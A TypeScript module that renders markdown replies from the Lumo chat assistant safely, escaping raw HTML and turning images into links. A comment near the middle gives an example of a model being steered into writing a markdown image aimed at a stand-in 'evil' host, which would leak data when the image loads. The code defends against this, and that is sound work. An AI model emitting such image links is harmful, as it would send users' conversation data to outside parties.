import markdownit from 'markdown-it';
import type Token from 'markdown-it/lib/token';
import { c } from 'ttag';

/**
 * Renders a Lumo reply (short, model-authored markdown) to HTML for a chat bubble. markdown-it keeps
 * its default `html: false`, so any raw HTML in the model output is escaped rather than injected, and
 * its default `validateLink` blocks `javascript:`/`vbscript:`/`data:` URLs — the same safe posture the
 * Mail app relies on in `textToHtml`. `breaks` turns single newlines into `<br>` and `linkify` makes
 * bare URLs clickable, both of which match how a chat reply reads.
 */
const parser = markdownit({ breaks: true, linkify: true });

// An <img> fetches its src on render, so a model steered into `![](https://evil/?d=…)` would leak data
// without a click. Images become links instead, as on lumo.proton.me.
parser.core.ruler.push('image_to_link', (state) => {
    const imageAsLink = (image: Token): Token[] => {
        const open = new state.Token('link_open', 'a', 1);
        open.attrSet('href', image.attrGet('src') ?? '');
        const label = new state.Token('text', '', 0);
        label.content = image.content.trim() || c('Label').t`Image`;
        return [open, label, new state.Token('link_close', 'a', -1)];
    };

    for (const block of state.tokens) {
        if (block.children) {
            block.children = block.children.flatMap((token) => (token.type === 'image' ? imageAsLink(token) : [token]));
        }
    }
});

parser.renderer.rules.link_open = (tokens, idx, options, _env, self) => {
    tokens[idx].attrSet('target', '_blank');
    tokens[idx].attrSet('rel', 'noopener noreferrer');
    return self.renderToken(tokens, idx, options);
};

export const renderReplyMarkdown = (text: string): string => parser.render(text);
